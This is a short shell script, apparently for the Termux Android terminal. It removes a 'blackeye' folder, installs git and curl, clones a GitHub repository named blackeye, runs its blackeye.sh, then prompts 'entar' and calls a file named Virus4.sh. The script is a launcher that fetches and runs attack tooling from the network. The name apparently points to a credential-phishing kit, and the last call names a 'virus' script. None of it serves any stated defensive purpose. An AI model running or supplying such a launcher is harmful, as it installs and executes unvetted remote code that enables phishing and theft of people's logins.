cd

rm -rf blackeye

pkg install git

git clone https://github.com/amcikk/blackeye.git

cd blackeye

pkg install curl

bash blackeye.sh


sleep 0.3


echo ""
echo ""
read -p "                   ------------>entar"
Virus4.sh
